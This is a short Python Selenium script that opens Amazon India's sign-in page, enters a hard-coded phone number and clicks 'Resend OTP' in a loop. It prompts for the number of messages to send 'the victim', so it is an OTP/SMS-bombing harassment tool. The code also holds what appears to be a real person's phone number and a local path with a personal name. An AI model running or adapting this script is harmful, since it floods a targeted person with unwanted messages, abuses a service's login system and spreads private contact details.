from selenium import webdriver
browser=webdriver.Chrome('C:\\Users\\ARNAB RAY\\Desktop\\python\\chromedriver_win32\\chromedriver.exe')
browser.get('https://www.amazon.in/ap/signin?_encoding=UTF8&openid.assoc_handle=inflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26action%3Dsign-out%26path%3D%252Fgp%252Fyourstore%252Fhome%26ref_%3Dnav_AccountFlyout_signout%26signIn%3D1%26useRedirectOnSuccess%3D1')

phone_number=9804790843

element=browser.find_element_by_id("ap_email")
element.send_keys(phone_number)

message_count=int(input("Enter the number of message you want to send the victim: "))


send_otp=browser.find_element_by_id("continue")
send_otp.click()

number=browser.find_element_by_id("continue")
number.click()

message_send=message_count-1
for i in range(message_send):
	send=browser.find_element_by_link_text("Resend OTP")
	send.click()
browser.quit()